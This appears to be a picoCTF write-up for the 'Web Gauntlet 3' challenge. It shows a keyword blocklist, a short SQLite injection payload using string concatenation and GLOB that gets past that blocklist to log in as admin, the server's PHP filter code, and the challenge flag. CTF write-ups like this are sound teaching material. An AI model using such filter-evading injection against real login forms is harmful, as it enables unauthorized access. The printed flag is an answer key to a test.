# Web Gauntlet 3
Category: Web, 300 points

## Description

> Last time, I promise! Only 25 characters this time. Log in as admin
>
> Filtered: or and true false union like = > < ; -- /* */ admin
> 
> Hint: sqlite

## Solution

This is a follow-up for [Web Gauntlet 2](Web_Gauntlet_2.md), with a shorter character limit. Luckily, the payload we used for the previous challenge is short enough to be accepted here as well:

```
username: adm'||'in
password: ' glob '*

Full query:

SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 
```

We get the following response from the server:

```php
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_ef4a5b40aa736f5016b4554fecb568d0}
?>
```

The flag: `picoCTF{k3ep_1t_sh0rt_ef4a5b40aa736f5016b4554fecb568d0}`